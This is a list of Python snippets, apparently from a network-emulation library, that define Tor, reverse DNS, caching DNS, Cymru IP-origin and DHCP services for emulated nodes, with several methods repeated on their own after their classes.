  "def configure(self, node: Node, tor: 'TorService'):\n        \"\"\"!\n        @brief configure TorServer node\n\n        @param node target node.\n        @param tor tor service.\n        \"\"\"\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'TorNode configure(): node has not interfaces'\n        addr = ifaces[0].getAddress()\n\n        if self.getRole() == \"DA\":\n            # Save DA address in tor service, other type of node will download fingerprint from these DA.\n            tor.addDirAuthority(addr)\n\n        if self.getRole() == \"HS\" and len(self.getLink()) != 0:\n            # take out link in HS server and set it to env variable, they would mapping to tor config file.\n            addr, port = self.getLink()\n            node.appendStartCommand(\"export TOR_HS_ADDR={}\".format(addr))\n            node.appendStartCommand(\"export TOR_HS_PORT={}\".format(port))",
  "def install(self, node: Node, tor: 'TorService'):\n        \"\"\"!\n        @brief Tor server installation step.\n\n        @param node target node.\n        @param tor tor service.\n        \"\"\"\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'node has not interfaces'\n        addr = ifaces[0].getAddress()\n        download_commands = \"\"\n        for dir in tor.getDirAuthority():\n            download_commands += TorServerFileTemplates[\"downloader\"].format(da_addr=dir)\n\n        node.addSoftware(\"git python3\")\n        node.addBuildCommand(BUILD_COMMANDS)\n\n        node.setFile(\"/etc/tor/torrc\", TorServerFileTemplates[\"torrc\"])\n        node.setFile(\"/etc/tor/torrc.da\", TorServerFileTemplates[\"torrc.da\"])\n        node.setFile(\"/usr/local/bin/da_fingerprint\", TorServerFileTemplates[\"da_fingerprint\"])\n        node.setFile(\"/usr/local/bin/tor-entrypoint\", TorServerFileTemplates[\"tor-entrypoint\"].format(TOR_IP=addr, downloader = download_commands))\n        \n        node.appendStartCommand(\"export TOR_ORPORT=7000\")\n        node.appendStartCommand(\"export TOR_DIRPORT=9030\")\n        node.appendStartCommand(\"export TOR_DIR=/tor\")\n        node.appendStartCommand(\"export ROLE={}\".format(self.__role))\n        node.appendStartCommand(\"chmod +x /usr/local/bin/tor-entrypoint /usr/local/bin/da_fingerprint\")\n        node.appendStartCommand(\"mkdir /tor\")\n       \n        # If node role is DA, launch a python web server for other node to download fingerprints.\n        if self.getRole() == \"DA\":\n            node.appendStartCommand(\"python3 -m http.server 8888 -d /tor\", True)\n        \n        node.appendStartCommand(\"tor-entrypoint\")\n        node.appendStartCommand(\"tor -f /etc/tor/torrc\")",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'TorServer'\n\n        return out",
  "def __init__(self):\n        super().__init__()\n        self.__da_nodes = []",
  "def getName(self):\n        return 'TorService'",
  "def _doConfigure(self, node: Node, server: TorServer):\n        server.configure(node, self)",
  "def addDirAuthority(self, addr: str) -> TorService:\n        \"\"\"!\n        @brief add DA.\n\n        @param addr address of DA.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__da_nodes.append(addr)\n\n        return self",
  "def getDirAuthority(self) -> List[str]:\n        \"\"\"!\n        @brief get DAs.\n\n        @returns list of DA addresses.\n        \"\"\"\n\n        return self.__da_nodes",
  "def __resolveHSLink(self, emulator: Emulator):\n        \"\"\"!\n        @brief Transfer vnode link to physical node IP address.\n\n        \"\"\"\n        for server in self.getPendingTargets().values():\n            if server.getRole() == \"HS\" and len(server.getLink()) != 0:\n                vname, port = server.getLink()\n                pnode = emulator.resolvVnode(vname)\n                ifaces = pnode.getInterfaces()\n                assert len(ifaces) > 0, '__resolveHSLink(): node as{}/{} has no interfaces'.format(pnode.getAsn(), pnode.getName())\n                addr = ifaces[0].getAddress()\n                server.setLink(addr, port)",
  "def configure(self, emulator: Emulator):\n        self.__resolveHSLink(emulator)\n        return super().configure(emulator)",
  "def _doInstall(self, node: Node, server: TorServer):\n        server.install(node, self)",
  "def _createServer(self) -> Server:\n        return TorServer()",
  "class ReverseDomainNameServer(Server):\n    \"\"\"!\n    @brief Reverse DNS server.\n    \"\"\"\n\n    def install(self, node: Node):\n        pass",
  "class ReverseDomainNameService(Service):\n    \"\"\"!\n    @brief Reverse DNS. This service hosts the in-addr.arpa. zone and resolve\n    IP addresses to nodename-netname.nodetype.asn.net\n    \"\"\"\n\n    __dns: DomainNameService\n\n    def __init__(self):\n        \"\"\"!\n        @brief ReverseDomainNameService constructor\n        \"\"\"\n        super().__init__()\n        self.addDependency('DomainNameService', True, False)\n        self.addDependency('Base', False, False)\n\n    def getName(self) -> str:\n        return 'ReverseDomainNameService'\n\n    def _createServer(self) -> Server:\n        return ReverseDomainNameServer()\n\n    def install(self, vnode: str) -> Server:\n        assert False, 'ReverseDomainNameService is not a real service and should not be installed this way. Please install a DomainNameService on the node and host the zone \"in-addr.arpa.\" yourself.'\n\n    def configure(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n\n        self._log('Creating \"in-addr.arpa.\" zone...')\n        self.__dns = reg.get('seedemu', 'layer', 'DomainNameService')\n        zone = self.__dns.getZone('in-addr.arpa.')\n\n        self._log('Collecting IP addresses...')\n        for ([scope, type, name], obj) in reg.getAll().items():\n            if type != 'rnode' and type != 'hnode': continue\n            self._log('Collecting {}/{}/{}...'.format(scope, type, name))\n\n            if scope == 'ix':\n                scope = name\n                name = 'rs'\n            else: scope = 'as' + scope\n\n            node: Node = obj\n            for iface in node.getInterfaces():\n                addr = '.'.join(reversed(str(iface.getAddress()).split('.')))\n                netname = iface.getNet().getName()\n                record = '{} PTR {}-{}.{}.{}.net.'.format(addr, name, netname, type, scope).replace('_', '-')\n                zone.addRecord(record)\n\n        return super().configure(emulator)\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'ReverseDomainNameService\\n'\n\n        return out",
  "def install(self, node: Node):\n        pass",
  "def __init__(self):\n        \"\"\"!\n        @brief ReverseDomainNameService constructor\n        \"\"\"\n        super().__init__()\n        self.addDependency('DomainNameService', True, False)\n        self.addDependency('Base', False, False)",
  "def getName(self) -> str:\n        return 'ReverseDomainNameService'",
  "def _createServer(self) -> Server:\n        return ReverseDomainNameServer()",
  "def install(self, vnode: str) -> Server:\n        assert False, 'ReverseDomainNameService is not a real service and should not be installed this way. Please install a DomainNameService on the node and host the zone \"in-addr.arpa.\" yourself.'",
  "def configure(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n\n        self._log('Creating \"in-addr.arpa.\" zone...')\n        self.__dns = reg.get('seedemu', 'layer', 'DomainNameService')\n        zone = self.__dns.getZone('in-addr.arpa.')\n\n        self._log('Collecting IP addresses...')\n        for ([scope, type, name], obj) in reg.getAll().items():\n            if type != 'rnode' and type != 'hnode': continue\n            self._log('Collecting {}/{}/{}...'.format(scope, type, name))\n\n            if scope == 'ix':\n                scope = name\n                name = 'rs'\n            else: scope = 'as' + scope\n\n            node: Node = obj\n            for iface in node.getInterfaces():\n                addr = '.'.join(reversed(str(iface.getAddress()).split('.')))\n                netname = iface.getNet().getName()\n                record = '{} PTR {}-{}.{}.{}.net.'.format(addr, name, netname, type, scope).replace('_', '-')\n                zone.addRecord(record)\n\n        return super().configure(emulator)",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'ReverseDomainNameService\\n'\n\n        return out",
  "class DomainNameCachingServer(Server, Configurable):\n    \"\"\"!\n    @brief Caching DNS server (i.e., Local DNS server)\n\n    @todo DNSSEC\n    \"\"\"\n\n    __root_servers: List[str]\n    __configure_resolvconf: bool\n    __emulator: Emulator\n    __pending_forward_zones: Dict[str, str]\n\n    def __init__(self):\n        \"\"\"!\n        @brief DomainNameCachingServer constructor.\n        \"\"\"\n        super().__init__()\n        self.__root_servers = []\n        self.__configure_resolvconf = False\n        self.__pending_forward_zones = {}\n\n    def setConfigureResolvconf(self, configure: bool) -> DomainNameCachingServer:\n        \"\"\"!\n        @brief Enable or disable set resolv.conf. When true, resolv.conf of all\n        other nodes in the AS will be set to this server.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__configure_resolvconf = configure\n\n        return self\n\n    def setRootServers(self, servers: List[str]) -> DomainNameCachingServer:\n        \"\"\"!\n        @brief Change root server hint.\n\n        By default, the caching server uses the root hint file shipped with\n        bind9. Use this method to override root hint. Note that if autoRoot is\n        set to true in DomainNameCachingService, manual changes will be\n        overridden.\n\n        @param servers list of IP addresses of the root servers.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__root_servers = servers\n\n        return self\n\n    def getRootServers(self) -> List[str]:\n        \"\"\"!\n        @brief Get root server list.\n\n        By default, the caching server uses the root hint file shipped with\n        bind9. Use setRootServers to override root hint.\n\n        This method will return list of servers set by setRootServers, or an\n        empty list if not set.\n        \"\"\"\n        return self.__root_servers\n\n    def addForwardZone(self, zone: str, vnode: str) -> DomainNameCachingServer:\n        \"\"\"!\n        @brief Add a new forward zone, forward to the given virtual node name.\n\n        @param name zone name.\n        @param vnode  virtual node name.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__pending_forward_zones[zone] = vnode\n\n        return self\n\n    def configure(self, emulator: Emulator):\n        self.__emulator = emulator\n\n    def install(self, node: Node):\n        node.addSoftware('bind9')\n        node.setFile('/etc/bind/named.conf.options', DomainNameCachingServiceFileTemplates['named_options'])\n        node.setFile('/etc/bind/named.conf.local','')\n        if len(self.__root_servers) > 0:\n            hint = '\\n'.join(self.__root_servers)\n            node.setFile('/usr/share/dns/root.hints', hint)\n            node.setFile('/etc/bind/db.root', hint)\n        node.appendStartCommand('service named start')\n\n        for (zone_name, vnode_name) in self.__pending_forward_zones.items():\n            pnode = self.__emulator.resolvVnode(vnode_name)\n\n            ifaces = pnode.getInterfaces()\n            assert len(ifaces) > 0, 'resolvePendingRecords(): node as{}/{} has no interfaces'.format(pnode.getAsn(), pnode.getName())\n            vnode_addr = ifaces[0].getAddress()\n            node.appendFile('/etc/bind/named.conf.local',\n                        'zone \"{}\" {{ type forward; forwarders {{ {}; }}; }};\\n'.format(zone_name, vnode_addr))\n\n        if not self.__configure_resolvconf: return\n\n        reg = self.__emulator.getRegistry()\n        (scope, _, _) = node.getRegistryInfo()\n        sr = ScopedRegistry(scope, reg)\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'Node {} has no IP address.'.format(node.getName())\n        addr = ifaces[0].getAddress()\n\n        for rnode in sr.getByType('rnode'):\n            rnode.appendFile('/etc/resolv.conf.new', 'nameserver {}\\n'.format(addr))\n            if 'cat /etc/resolv.conf.new > /etc/resolv.conf' not in rnode.getStartCommands():\n                rnode.appendStartCommand('cat /etc/resolv.conf.new > /etc/resolv.conf')\n\n        for hnode in sr.getByType('hnode'):\n            if 'cat /etc/resolv.conf.new > /etc/resolv.conf' not in hnode.getStartCommands():\n                hnode.appendStartCommand('cat /etc/resolv.conf.new > /etc/resolv.conf')\n            hnode.appendFile('/etc/resolv.conf.new', 'nameserver {}\\n'.format(addr))",
  "class DomainNameCachingService(Service):\n    \"\"\"!\n    @brief Caching DNS (i.e., Local DNS)\n\n    @todo DNSSEC\n    \"\"\"\n\n    __auto_root: bool\n\n    def __init__(self, autoRoot: bool = True):\n        \"\"\"!\n        @brief DomainNameCachingService constructor.\n\n        @param autoRoot (optional) find root zone name servers automatically.\n        True by default, if true, DomainNameCachingService will find root NS in\n        DomainNameService and use them as root.\n        \"\"\"\n        super().__init__()\n        self.__auto_root = autoRoot\n        self.addDependency('Base', False, False)\n        if autoRoot:\n            self.addDependency('DomainNameService', False, False)\n\n    def _createServer(self) -> DomainNameCachingServer:\n        return DomainNameCachingServer()\n\n    def getName(self) -> str:\n        return 'DomainNameCachingService'\n\n    def getConflicts(self) -> List[str]:\n        return ['DomainNameService']\n\n    def configure(self, emulator: Emulator):\n        super().configure(emulator)\n\n        targets = self.getTargets()\n        for (server, node) in targets:\n            server.configure(emulator)\n\n        if self.__auto_root:\n            dns_layer: DomainNameService = emulator.getRegistry().get('seedemu', 'layer', 'DomainNameService')\n            root_zone = dns_layer.getRootZone()\n            root_servers = root_zone.getGuleRecords()\n            for (server, node) in targets:\n                server.setRootServers(root_servers)\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DomainNameCachingService:\\n'\n\n        indent += 4\n\n        out += ' ' * indent\n        out += 'Configure root hint: {}\\n'.format(self.__auto_root)\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief DomainNameCachingServer constructor.\n        \"\"\"\n        super().__init__()\n        self.__root_servers = []\n        self.__configure_resolvconf = False\n        self.__pending_forward_zones = {}",
  "def setConfigureResolvconf(self, configure: bool) -> DomainNameCachingServer:\n        \"\"\"!\n        @brief Enable or disable set resolv.conf. When true, resolv.conf of all\n        other nodes in the AS will be set to this server.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__configure_resolvconf = configure\n\n        return self",
  "def setRootServers(self, servers: List[str]) -> DomainNameCachingServer:\n        \"\"\"!\n        @brief Change root server hint.\n\n        By default, the caching server uses the root hint file shipped with\n        bind9. Use this method to override root hint. Note that if autoRoot is\n        set to true in DomainNameCachingService, manual changes will be\n        overridden.\n\n        @param servers list of IP addresses of the root servers.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__root_servers = servers\n\n        return self",
  "def getRootServers(self) -> List[str]:\n        \"\"\"!\n        @brief Get root server list.\n\n        By default, the caching server uses the root hint file shipped with\n        bind9. Use setRootServers to override root hint.\n\n        This method will return list of servers set by setRootServers, or an\n        empty list if not set.\n        \"\"\"\n        return self.__root_servers",
  "def addForwardZone(self, zone: str, vnode: str) -> DomainNameCachingServer:\n        \"\"\"!\n        @brief Add a new forward zone, forward to the given virtual node name.\n\n        @param name zone name.\n        @param vnode  virtual node name.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__pending_forward_zones[zone] = vnode\n\n        return self",
  "def configure(self, emulator: Emulator):\n        self.__emulator = emulator",
  "def install(self, node: Node):\n        node.addSoftware('bind9')\n        node.setFile('/etc/bind/named.conf.options', DomainNameCachingServiceFileTemplates['named_options'])\n        node.setFile('/etc/bind/named.conf.local','')\n        if len(self.__root_servers) > 0:\n            hint = '\\n'.join(self.__root_servers)\n            node.setFile('/usr/share/dns/root.hints', hint)\n            node.setFile('/etc/bind/db.root', hint)\n        node.appendStartCommand('service named start')\n\n        for (zone_name, vnode_name) in self.__pending_forward_zones.items():\n            pnode = self.__emulator.resolvVnode(vnode_name)\n\n            ifaces = pnode.getInterfaces()\n            assert len(ifaces) > 0, 'resolvePendingRecords(): node as{}/{} has no interfaces'.format(pnode.getAsn(), pnode.getName())\n            vnode_addr = ifaces[0].getAddress()\n            node.appendFile('/etc/bind/named.conf.local',\n                        'zone \"{}\" {{ type forward; forwarders {{ {}; }}; }};\\n'.format(zone_name, vnode_addr))\n\n        if not self.__configure_resolvconf: return\n\n        reg = self.__emulator.getRegistry()\n        (scope, _, _) = node.getRegistryInfo()\n        sr = ScopedRegistry(scope, reg)\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'Node {} has no IP address.'.format(node.getName())\n        addr = ifaces[0].getAddress()\n\n        for rnode in sr.getByType('rnode'):\n            rnode.appendFile('/etc/resolv.conf.new', 'nameserver {}\\n'.format(addr))\n            if 'cat /etc/resolv.conf.new > /etc/resolv.conf' not in rnode.getStartCommands():\n                rnode.appendStartCommand('cat /etc/resolv.conf.new > /etc/resolv.conf')\n\n        for hnode in sr.getByType('hnode'):\n            if 'cat /etc/resolv.conf.new > /etc/resolv.conf' not in hnode.getStartCommands():\n                hnode.appendStartCommand('cat /etc/resolv.conf.new > /etc/resolv.conf')\n            hnode.appendFile('/etc/resolv.conf.new', 'nameserver {}\\n'.format(addr))",
  "def __init__(self, autoRoot: bool = True):\n        \"\"\"!\n        @brief DomainNameCachingService constructor.\n\n        @param autoRoot (optional) find root zone name servers automatically.\n        True by default, if true, DomainNameCachingService will find root NS in\n        DomainNameService and use them as root.\n        \"\"\"\n        super().__init__()\n        self.__auto_root = autoRoot\n        self.addDependency('Base', False, False)\n        if autoRoot:\n            self.addDependency('DomainNameService', False, False)",
  "def _createServer(self) -> DomainNameCachingServer:\n        return DomainNameCachingServer()",
  "def getName(self) -> str:\n        return 'DomainNameCachingService'",
  "def getConflicts(self) -> List[str]:\n        return ['DomainNameService']",
  "def configure(self, emulator: Emulator):\n        super().configure(emulator)\n\n        targets = self.getTargets()\n        for (server, node) in targets:\n            server.configure(emulator)\n\n        if self.__auto_root:\n            dns_layer: DomainNameService = emulator.getRegistry().get('seedemu', 'layer', 'DomainNameService')\n            root_zone = dns_layer.getRootZone()\n            root_servers = root_zone.getGuleRecords()\n            for (server, node) in targets:\n                server.setRootServers(root_servers)",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DomainNameCachingService:\\n'\n\n        indent += 4\n\n        out += ' ' * indent\n        out += 'Configure root hint: {}\\n'.format(self.__auto_root)\n\n        return out",
  "class CymruIpOriginServer(Server):\n    \"\"\"!\n    @brief Cymru's IP info service server.\n    \"\"\"\n\n    def install(self, node: Node):\n        pass",
  "class CymruIpOriginService(Service):\n    \"\"\"!\n    @brief Cymru's IP info service.\n\n    Cymru's IP info service is used by various traceroute utilities to map IP\n    address to ASN (using DNS). This service loads the prefix list within the\n    simulation and creates ASN mappings for them, so with proper local DNS\n    configured, nodes can see the ASN when doing traceroute. \n\n    This layer hosts the domain cymru.com.\n    \"\"\"\n\n    __records: List[str]\n    __dns: DomainNameService\n\n    def __init__(self):\n        \"\"\"!\n        @brief CymruIpOriginService constructor\n        \"\"\"\n        super().__init__()\n        self.__records = []\n        self.addDependency('DomainNameService', True, True)\n        self.addDependency('Base', False, False)\n\n    def _createServer(self) -> Server:\n        return CymruIpOriginServer()\n\n    def getName(self) -> str:\n        return 'CymruIpOriginService'\n\n    def addMapping(self, prefix: str, asn: int) -> CymruIpOriginService:\n        \"\"\"!\n        @brief Add new prefix -> asn mapping.\n\n        @param prefix prefix.\n        @param asn asn.\n\n        @throws AssertionError if prefix invalid.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        [pfx, cidr] = prefix.split('/')\n        cidr = int(cidr)\n        assert cidr <= 24, 'Invalid prefix.'\n        prefix = IPv4Network(prefix)\n\n        sub_cidr = 24\n        num_8s = 3\n\n        if cidr >= 0:\n            sub_cidr = 8\n            num_8s = 1\n\n        if cidr >= 9:\n            sub_cidr = 16\n            num_8s = 2\n\n        if cidr >= 17:\n            sub_cidr = 24\n            num_8s = 3\n\n        for net in prefix.subnets(new_prefix = sub_cidr):\n            record = '*.'\n            record += '.'.join(reversed(str(net).split('.')[0:3]))\n            record += '.origin.asn TXT \"{} | {} | ZZ | SEED | 0000-00-00\"'.format(asn, net)\n            self.__records.append(record)\n\n        return self\n\n    def getRecords(self) -> List[str]:\n        \"\"\"!\n        @brief get generated records.\n\n        @return list of records.\n        \"\"\"\n        return self.__records\n\n    def addRecord(self, record: str) -> CymruIpOriginService:\n        \"\"\"!\n        @brief add record directly to the cymru zone. You should use addMapping\n        to add mapping and not addRecord, unless you know what you are doing.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__records.append(record)\n\n        return self\n\n    def _doInstall(self, node: Node, server: Server): \n        assert False, 'CymruIpOriginService is not a real service and should not be installed this way. Please install a DomainNameService on the node and host the zone \"cymru.com.\" yourself.'\n\n\n    def configure(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n\n        mappings: List[Tuple[str, str]] = []\n        \n        self._log('Collecting all networks in the simulation...')\n        for regobj in reg.getAll().items():\n            [(asn, type, name), obj] = regobj\n            if type != 'net': continue\n            net: Network = obj\n            if asn == 'ix': asn = name.replace('ix', '')\n            \n            asn_val = 0\n            try:\n                asn_val = int(asn)\n            except ValueError:\n                asn_val = 0\n\n            mappings.append((net.getPrefix(), asn_val))\n\n        for mapping in mappings:\n            (prefix, asn) = mapping\n            self.addMapping(str(prefix), asn)\n\n        self._log('Creating \"cymru.com.\" zone...')\n        dns: DomainNameService = reg.get('seedemu', 'layer', 'DomainNameService')\n        zone = dns.getZone('cymru.com.')\n        self.__dns = dns\n\n        self._log('Adding mappings...')\n        for record in self.__records:\n            zone.addRecord(record)\n\n        return super().configure(emulator)        \n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'CymruIpOriginService\\n'\n\n        return out",
  "def install(self, node: Node):\n        pass",
  "def __init__(self):\n        \"\"\"!\n        @brief CymruIpOriginService constructor\n        \"\"\"\n        super().__init__()\n        self.__records = []\n        self.addDependency('DomainNameService', True, True)\n        self.addDependency('Base', False, False)",
  "def _createServer(self) -> Server:\n        return CymruIpOriginServer()",
  "def getName(self) -> str:\n        return 'CymruIpOriginService'",
  "def addMapping(self, prefix: str, asn: int) -> CymruIpOriginService:\n        \"\"\"!\n        @brief Add new prefix -> asn mapping.\n\n        @param prefix prefix.\n        @param asn asn.\n\n        @throws AssertionError if prefix invalid.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        [pfx, cidr] = prefix.split('/')\n        cidr = int(cidr)\n        assert cidr <= 24, 'Invalid prefix.'\n        prefix = IPv4Network(prefix)\n\n        sub_cidr = 24\n        num_8s = 3\n\n        if cidr >= 0:\n            sub_cidr = 8\n            num_8s = 1\n\n        if cidr >= 9:\n            sub_cidr = 16\n            num_8s = 2\n\n        if cidr >= 17:\n            sub_cidr = 24\n            num_8s = 3\n\n        for net in prefix.subnets(new_prefix = sub_cidr):\n            record = '*.'\n            record += '.'.join(reversed(str(net).split('.')[0:3]))\n            record += '.origin.asn TXT \"{} | {} | ZZ | SEED | 0000-00-00\"'.format(asn, net)\n            self.__records.append(record)\n\n        return self",
  "def getRecords(self) -> List[str]:\n        \"\"\"!\n        @brief get generated records.\n\n        @return list of records.\n        \"\"\"\n        return self.__records",
  "def addRecord(self, record: str) -> CymruIpOriginService:\n        \"\"\"!\n        @brief add record directly to the cymru zone. You should use addMapping\n        to add mapping and not addRecord, unless you know what you are doing.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__records.append(record)\n\n        return self",
  "def _doInstall(self, node: Node, server: Server): \n        assert False, 'CymruIpOriginService is not a real service and should not be installed this way. Please install a DomainNameService on the node and host the zone \"cymru.com.\" yourself.'",
  "def configure(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n\n        mappings: List[Tuple[str, str]] = []\n        \n        self._log('Collecting all networks in the simulation...')\n        for regobj in reg.getAll().items():\n            [(asn, type, name), obj] = regobj\n            if type != 'net': continue\n            net: Network = obj\n            if asn == 'ix': asn = name.replace('ix', '')\n            \n            asn_val = 0\n            try:\n                asn_val = int(asn)\n            except ValueError:\n                asn_val = 0\n\n            mappings.append((net.getPrefix(), asn_val))\n\n        for mapping in mappings:\n            (prefix, asn) = mapping\n            self.addMapping(str(prefix), asn)\n\n        self._log('Creating \"cymru.com.\" zone...')\n        dns: DomainNameService = reg.get('seedemu', 'layer', 'DomainNameService')\n        zone = dns.getZone('cymru.com.')\n        self.__dns = dns\n\n        self._log('Adding mappings...')\n        for record in self.__records:\n            zone.addRecord(record)\n\n        return super().configure(emulator)",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'CymruIpOriginService\\n'\n\n        return out",
  "class DHCPServer(Server):\n    \"\"\"!\n    @brief The dynamic host configuration protocol server.\n    \"\"\"\n    __node: Node\n    __emulator: Emulator\n    __name_servers: str\n    __dhcp_start: int\n    __dhcp_end: int\n    __is_range_changed: bool\n\n    def __init__(self):\n        \"\"\"!\n        @brief DHCPServer Constructor.\n        \"\"\"\n        super().__init__()\n        self.__name_servers = \"#option domain-name-servers none;\"\n        self.__is_range_changed = False\n\n    def configure(self, node: Node, emulator:Emulator):\n        \"\"\"!\n        @brief configure the node\n        \"\"\"\n        self.__node = node\n        self.__emulator = emulator\n\n    def setIpRange(self, dhcpStart:int, dhcpEnd: int) -> DHCPServer:\n        \"\"\"!\n        @brief set DHCP IP range\n        \"\"\"\n        self.__dhcp_start = dhcpStart\n        self.__dhcp_end = dhcpEnd\n        self.__is_range_changed = True\n        \n        return self\n\n    def install(self, node:Node):\n        \"\"\"!\n        @brief Install the service\n        \"\"\"\n\n        node.addSoftware('isc-dhcp-server')\n\n        ifaces = self.__node.getInterfaces()\n        assert len(ifaces) > 0, 'node {} has no interfaces'.format(node.getName())\n        \n        reg = self.__emulator.getRegistry()\n        (scope, _, _) = node.getRegistryInfo()\n        rif: Interface = None\n        hif: Interface = ifaces[0]\n        hnet: Network = hif.getNet()\n\n        cur_scope = ScopedRegistry(scope, reg)\n        for router in cur_scope.getByType('rnode'):\n            if rif != None: break\n            for riface in router.getInterfaces():\n                if riface.getNet() == hnet:\n                    rif = riface\n                    break\n\n        assert rif != None, 'Host {} in as{} in network {}: no router'.format(self.__node.getname, scope, hnet.getName())\n                \n        subnet = hnet.getPrefix().with_netmask.split('/')[0]\n        netmask = hnet.getPrefix().with_netmask.split('/')[1]\n        iface_name = hnet.getName()\n        router_address = rif.getAddress()\n        broadcast_address = hnet.getPrefix().broadcast_address\n        \n        if (self.__is_range_changed):\n            hnet.setDhcpIpRange(self.__dhcp_start, self.__dhcp_end)\n            \n        ip_address_start, ip_address_end = hnet.getDhcpIpRange()\n        ip_start = ip_end = '.'.join(subnet.split(\".\")[0:3])\n        ip_start += \".\" + ip_address_start\n        ip_end += \".\" + ip_address_end\n\n        nameServers:list = self.__node.getNameServers()\n\n        if len(nameServers) > 0:\n            self.__name_servers =  DHCPServiceFileTemplates['dhcpd_conf_dns'].format(name_servers = \", \".join(nameServers))       \n\n        node.setFile('/etc/default/isc-dhcp-server', DHCPServiceFileTemplates['isc_dhcp_server_conf'].format(iface=iface_name))\n        node.setFile('/etc/dhcp/dhcpd.conf', DHCPServiceFileTemplates['dhcpd_conf'].format(\n            subnet = subnet,\n            netmask = netmask, \n            name_servers = self.__name_servers,\n            ip_start = ip_start,\n            ip_end = ip_end,\n            router = router_address, \n            broadcast_address = broadcast_address\n        ))\n\n        node.appendStartCommand('/etc/init.d/isc-dhcp-server restart')\n\n    \n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DHCP server object.\\n'\n\n        return out",
  "class DHCPService(Service):\n    \"\"\"!\n    @brief The dynamic host configuration protocol service class.\n    \"\"\"\n\n    def __init__(self):\n        \"\"\"!\n        @brief DHCPService constructor\n        \"\"\"\n\n        super().__init__()\n        self.addDependency('Base', False, False)\n\n    def _createServer(self) -> Server:\n        return DHCPServer()\n\n\n    def configure(self, emulator: Emulator):\n        super().configure(emulator)\n        targets = self.getTargets()\n        for (server, node) in targets:\n            server.configure(node, emulator)\n\n    def getName(self) -> str:\n        return 'DHCPService'\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DHCPServiceLayer\\n'\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief DHCPServer Constructor.\n        \"\"\"\n        super().__init__()\n        self.__name_servers = \"#option domain-name-servers none;\"\n        self.__is_range_changed = False",
  "def configure(self, node: Node, emulator:Emulator):\n        \"\"\"!\n        @brief configure the node\n        \"\"\"\n        self.__node = node\n        self.__emulator = emulator",
  "def setIpRange(self, dhcpStart:int, dhcpEnd: int) -> DHCPServer:\n        \"\"\"!\n        @brief set DHCP IP range\n        \"\"\"\n        self.__dhcp_start = dhcpStart\n        self.__dhcp_end = dhcpEnd\n        self.__is_range_changed = True\n        \n        return self",
  "def install(self, node:Node):\n        \"\"\"!\n        @brief Install the service\n        \"\"\"\n\n        node.addSoftware('isc-dhcp-server')\n\n        ifaces = self.__node.getInterfaces()\n        assert len(ifaces) > 0, 'node {} has no interfaces'.format(node.getName())\n        \n        reg = self.__emulator.getRegistry()\n        (scope, _, _) = node.getRegistryInfo()\n        rif: Interface = None\n        hif: Interface = ifaces[0]\n        hnet: Network = hif.getNet()\n\n        cur_scope = ScopedRegistry(scope, reg)\n        for router in cur_scope.getByType('rnode'):\n            if rif != None: break\n            for riface in router.getInterfaces():\n                if riface.getNet() == hnet:\n                    rif = riface\n                    break\n\n        assert rif != None, 'Host {} in as{} in network {}: no router'.format(self.__node.getname, scope, hnet.getName())\n                \n        subnet = hnet.getPrefix().with_netmask.split('/')[0]\n        netmask = hnet.getPrefix().with_netmask.split('/')[1]\n        iface_name = hnet.getName()\n        router_address = rif.getAddress()\n        broadcast_address = hnet.getPrefix().broadcast_address\n        \n        if (self.__is_range_changed):\n            hnet.setDhcpIpRange(self.__dhcp_start, self.__dhcp_end)\n            \n        ip_address_start, ip_address_end = hnet.getDhcpIpRange()\n        ip_start = ip_end = '.'.join(subnet.split(\".\")[0:3])\n        ip_start += \".\" + ip_address_start\n        ip_end += \".\" + ip_address_end\n\n        nameServers:list = self.__node.getNameServers()\n\n        if len(nameServers) > 0:\n            self.__name_servers =  DHCPServiceFileTemplates['dhcpd_conf_dns'].format(name_servers = \", \".join(nameServers))       \n\n        node.setFile('/etc/default/isc-dhcp-server', DHCPServiceFileTemplates['isc_dhcp_server_conf'].format(iface=iface_name))\n        node.setFile('/etc/dhcp/dhcpd.conf', DHCPServiceFileTemplates['dhcpd_conf'].format(\n            subnet = subnet,\n            netmask = netmask, \n            name_servers = self.__name_servers,\n            ip_start = ip_start,\n            ip_end = ip_end,\n            router = router_address, \n            broadcast_address = broadcast_address\n        ))\n\n        node.appendStartCommand('/etc/init.d/isc-dhcp-server restart')",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DHCP server object.\\n'\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief DHCPService constructor\n        \"\"\"\n\n        super().__init__()\n        self.addDependency('Base', False, False)",
  "def _createServer(self) -> Server:\n        return DHCPServer()",
  "def configure(self, emulator: Emulator):\n        super().configure(emulator)\n        targets = self.getTargets()\n        for (server, node) in targets:\n            server.configure(node, emulator)",
  "def getName(self) -> str:\n        return 'DHCPService'",
